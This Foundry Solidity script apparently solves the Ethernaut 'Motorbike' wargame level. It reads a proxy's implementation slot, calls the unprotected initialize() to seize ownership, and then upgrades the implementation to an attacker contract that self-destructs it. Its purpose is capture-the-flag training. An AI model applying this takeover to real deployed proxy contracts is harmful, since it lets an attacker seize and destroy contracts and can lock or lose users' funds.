// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IMotorbike, IEngine } from "ethernaut/25-motorbike/IMotorbike.sol";
import { MotorbikeAttacker } from "ethernaut/25-motorbike/MotorbikeAttacker.sol";

contract MotorbikeScript is Script {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address motorbikeAddr = vm.envAddress("L25_MOTORBIKE_ADDRESS");

        // Step 1: deploy MotorbikeAttacker
        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker();

        // Step 2: get implementation address from Proxy's slot 0, and initialise IEngine
        address engineAddr = address(uint160(uint256(vm.load(motorbikeAddr, IMPLEMENTATION_SLOT))));
        IEngine engine = IEngine(engineAddr);

        // Step 3: become the Engine owner
        engine.initialize();

        // Step 4: replace the current implementation address with the attacker one. Then force its destruction
        bytes memory delegatecall = abi.encodeCall(motorbikeAttacker.destruct, ());
        engine.upgradeToAndCall(address(motorbikeAttacker), delegatecall);

        vm.stopBroadcast();
    }
}
